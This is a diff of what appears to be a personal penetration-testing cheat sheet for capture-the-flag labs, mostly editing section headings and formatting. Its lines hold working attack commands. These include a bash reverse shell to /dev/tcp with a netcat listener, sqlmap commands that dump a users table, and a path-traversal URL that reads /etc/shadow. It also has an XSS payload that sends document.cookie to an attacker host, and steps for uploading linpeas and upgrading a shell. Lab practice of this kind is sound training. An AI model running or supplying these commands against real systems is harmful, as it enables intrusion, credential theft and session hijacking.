@@ -48,11 +48,6 @@ script -qc /bin/bash /dev/null
 
 ## FTP
 
-ftp 10.10.10.10
-
-user: anonymous
-password: anonymous
-
 scp linpeas.sh jan@10.10.122.69:/dev/shm
 
 ## mysql 
@@ -71,7 +66,7 @@ sqlmap -u 10.10.115.80/register.php --data "log_email=test&log_password=test&log
 
 sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump
 
-## website
+## LFI
 
 http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
 
@@ -138,6 +133,8 @@ bash -i >& /dev/tcp/10.9.46.252/1234 0>&1
 
 netcat -lvnp 1234 (or nc)
 
+upgrade shell
+```
 python -c "import pty; pty.spawn('/bin/bash')"
 
 control+z
@@ -149,7 +146,7 @@ fg
 press enter a few times
 
 export TERM=xterm
-
+```
 ## XSS 
 
 <script> new Image().src = "http://myIP:1234/stolencookie.php?cookie="+document.cookie;</script> (payload)
